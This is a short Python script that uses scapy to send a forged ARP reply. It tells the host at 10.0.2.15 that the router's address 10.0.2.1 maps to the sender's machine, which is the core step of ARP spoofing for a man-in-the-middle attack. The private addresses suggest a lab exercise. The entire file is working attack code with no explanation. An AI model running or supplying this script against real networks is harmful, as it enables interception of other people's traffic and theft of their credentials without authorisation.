#!/usr/bin/env python

import scapy.all as scapy

target_ip = "10.0.2.15"
target_mac = "08:00:27:70:92:1d"
router_ip = "10.0.2.1"

packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
scapy.send(packet)
